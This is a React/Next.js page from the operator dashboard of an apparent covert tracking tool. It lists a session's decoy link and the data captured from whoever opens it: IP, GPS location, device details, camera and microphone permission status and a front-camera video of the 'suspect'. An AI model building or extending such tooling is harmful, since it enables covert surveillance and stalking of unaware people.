"use client";

import { useEffect, useState, use } from "react";
import Link from "next/link";

export default function SessionDetail({ params }) {
  const { sessionId } = use(params);
  const [session, setSession] = useState(null);
  const [events, setEvents] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    Promise.all([
      fetch(`${process.env.NEXT_PUBLIC_STRAPI_URL}/api/tracking-sessions/${sessionId}`).then(r => r.json()),
      fetch(`${process.env.NEXT_PUBLIC_STRAPI_URL}/api/tracking-events?filters[session][documentId][$eq]=${sessionId}&sort=triggered_at:desc`).then(r => r.json())
    ]).then(([sessionData, eventsData]) => {
      setSession(sessionData.data);
      setEvents(eventsData.data || []);
      setLoading(false);
    });
  }, [sessionId]);

  const copyLink = () => {
    if (!session) return;
    const full = `${window.location.origin}${session.tracking_link}`;
    navigator.clipboard.writeText(full);
    alert("Tracking link copied!");
  };

  if (loading) return (
    <div style={{ padding: "32px", color: "var(--text3)" }}>Loading...</div>
  );

  if (!session) return (
    <div style={{ padding: "32px", color: "var(--text3)" }}>Session not found</div>
  );

  return (
    <div style={{ padding: "32px" }}>
      <Link href="/geolocation" style={{ fontSize: "13px", color: "var(--text2)", textDecoration: "none" }}>
        ← Back to Sessions
      </Link>

      {/* Header */}
      <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", margin: "16px 0 28px" }}>
        <div>
          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
            <h1 style={{
              fontFamily: "var(--font-syne)", fontSize: "22px",
              fontWeight: 700, letterSpacing: "-0.5px", color: "var(--text)"
            }}>
              {session.name}
            </h1>
            <span style={{
              fontSize: "11px", padding: "3px 10px", borderRadius: "20px",
              fontWeight: 500,
              background: session.status1 === "active" ? "#E1F5EE" : "var(--bg3)",
              color: session.status1 === "active" ? "#0F6E56" : "var(--text2)"
            }}>
              {session.status1}
            </span>
          </div>
          <p style={{ fontSize: "13px", color: "var(--text2)", marginTop: "4px" }}>
            {session.session_id} · {events.length} {events.length === 1 ? "event" : "events"} captured
          </p>
        </div>
        <button
          onClick={copyLink}
          style={{
            background: "var(--accent)", color: "var(--accent-text)",
            border: "none", padding: "9px 18px", borderRadius: "8px",
            fontSize: "13px", fontWeight: 500, cursor: "pointer"
          }}
        >
          📋 Copy Tracking Link
        </button>
      </div>

      {/* Session info */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: "12px", marginBottom: "28px" }}>
        {[
          { label: "Tracking Link", value: `${typeof window !== "undefined" ? window.location.origin : ""}${session.tracking_link}` },
          { label: "Decoy URL", value: session.decoy_url || "Not set" },
          { label: "Created", value: new Date(session.createdAt).toLocaleDateString("en-IN", { day: "numeric", month: "short", year: "numeric" }) },
        ].map(item => (
          <div key={item.label} style={{
            background: "var(--bg2)", borderRadius: "10px",
            padding: "14px", border: "0.5px solid var(--border)"
          }}>
            <div style={{ fontSize: "10px", color: "var(--text3)", textTransform: "uppercase", letterSpacing: "0.8px", marginBottom: "6px" }}>
              {item.label}
            </div>
            <div style={{ fontSize: "12px", color: "var(--text)", wordBreak: "break-all" }}>
              {item.value}
            </div>
          </div>
        ))}
      </div>

      {/* Events */}
      <div style={{ fontSize: "11px", fontWeight: 500, color: "var(--text3)", textTransform: "uppercase", letterSpacing: "0.8px", marginBottom: "14px" }}>
        Captured Events
      </div>

      {events.length === 0 ? (
        <div style={{
          border: "0.5px solid var(--border)", borderRadius: "12px",
          padding: "48px", textAlign: "center"
        }}>
          <div style={{ fontSize: "32px", marginBottom: "12px" }}>⏳</div>
          <div style={{ fontWeight: 500, fontSize: "16px", color: "var(--text)", marginBottom: "8px" }}>
            Waiting for suspect to click the link
          </div>
          <div style={{ fontSize: "13px", color: "var(--text2)" }}>
            Events will appear here in real time once the link is opened
          </div>
        </div>
      ) : (
        <div style={{ display: "flex", flexDirection: "column", gap: "16px" }}>
          {events.map((event, index) => (
            <div key={event.id} style={{
              border: "0.5px solid var(--border)", borderRadius: "12px",
              padding: "20px", background: "var(--bg)"
            }}>
              <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "16px" }}>
                <div style={{ fontWeight: 500, fontSize: "14px", color: "var(--text)" }}>
                  Event #{events.length - index}
                </div>
                <div style={{ fontSize: "12px", color: "var(--text3)" }}>
                  {new Date(event.triggered_at).toLocaleString("en-IN")}
                </div>
              </div>

              <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(200px, 1fr))", gap: "10px" }}>

                {/* Network */}
                <InfoCard label="IP Address" value={event.ip_address} icon="🌐" />
                <InfoCard label="ISP" value={event.isp || "Unknown"} icon="📡" />
                <InfoCard label="Location" value={`${event.city}, ${event.country}`} icon="📍" />

                {/* GPS */}
                {event.latitude && event.longitude && (
                  <InfoCard
                    label="GPS Coordinates"
                    value={`${event.latitude?.toFixed(5)}, ${event.longitude?.toFixed(5)}`}
                    icon="🛰️"
                    link={`https://maps.google.com/?q=${event.latitude},${event.longitude}`}
                  />
                )}

                {/* Device */}
                <InfoCard label="Device" value={event.device_type || "Unknown"} icon="📱" />
                <InfoCard label="OS" value={event.os || "Unknown"} icon="💻" />
                <InfoCard label="Browser" value={event.browser || "Unknown"} icon="🔍" />
                <InfoCard label="Screen" value={event.screen_resolution || "Unknown"} icon="🖥️" />

                {/* Permissions */}
                <div style={{
                  background: "var(--bg2)", borderRadius: "8px",
                  padding: "12px", border: "0.5px solid var(--border)"
                }}>
                  <div style={{ fontSize: "10px", color: "var(--text3)", textTransform: "uppercase", letterSpacing: "0.8px", marginBottom: "8px" }}>
                    Permissions
                  </div>
                  <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
                    {["camera", "mic", "location"].map(perm => (
                      <span key={perm} style={{
                        fontSize: "11px", padding: "2px 8px", borderRadius: "10px",
                        background: event.permissions?.[perm] ? "#E1F5EE" : "#FDECEA",
                        color: event.permissions?.[perm] ? "#0F6E56" : "#A32D2D",
                        fontWeight: 500
                      }}>
                        {perm}: {event.permissions?.[perm] ? "✓" : "✗"}
                      </span>
                    ))}
                  </div>
                </div>

              </div>

              {/* Map link if GPS available */}
              {event.latitude && event.longitude && (
                <div style={{ marginTop: "12px" }}>
                  <a
                    href={`https://maps.google.com/?q=${event.latitude},${event.longitude}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      fontSize: "12px", color: "#185FA5", textDecoration: "none",
                      display: "inline-flex", alignItems: "center", gap: "4px"
                    }}
                  >
                    🗺️ View on Google Maps
                  </a>
                </div>
              )}

              {/* Front camera video */}
                {event.front_video && (
                <div style={{ marginTop: "12px" }}>
                    <div style={{
                    fontSize: "10px", color: "var(--text3)",
                    textTransform: "uppercase", letterSpacing: "0.8px",
                    marginBottom: "8px"
                    }}>
                    🎥 Front Camera Recording
                    </div>
                    <video
                    src={`${process.env.NEXT_PUBLIC_STRAPI_URL}${event.front_video}`}
                    controls
                    style={{
                        width: "320px", height: "240px",
                        borderRadius: "8px",
                        border: "0.5px solid var(--border)",
                        background: "#000"
                    }}
                    />
                </div>
                )}

              {/* User agent */}
              <div style={{ marginTop: "12px", padding: "10px", background: "var(--bg2)", borderRadius: "8px" }}>
                <div style={{ fontSize: "10px", color: "var(--text3)", textTransform: "uppercase", letterSpacing: "0.8px", marginBottom: "4px" }}>
                  User Agent
                </div>
                <div style={{ fontSize: "11px", color: "var(--text3)", wordBreak: "break-all", lineHeight: 1.6 }}>
                  {event.user_agent}
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function InfoCard({ label, value, icon, link }) {
  return (
    <div style={{
      background: "var(--bg2)", borderRadius: "8px",
      padding: "12px", border: "0.5px solid var(--border)"
    }}>
      <div style={{ fontSize: "10px", color: "var(--text3)", textTransform: "uppercase", letterSpacing: "0.8px", marginBottom: "6px" }}>
        {icon} {label}
      </div>
      {link ? (
        <a href={link} target="_blank" rel="noopener noreferrer" style={{ fontSize: "13px", color: "#185FA5", textDecoration: "none" }}>
          {value}
        </a>
      ) : (
        <div style={{ fontSize: "13px", color: "var(--text)", fontWeight: 500 }}>
          {value}
        </div>
      )}
    </div>
  );
}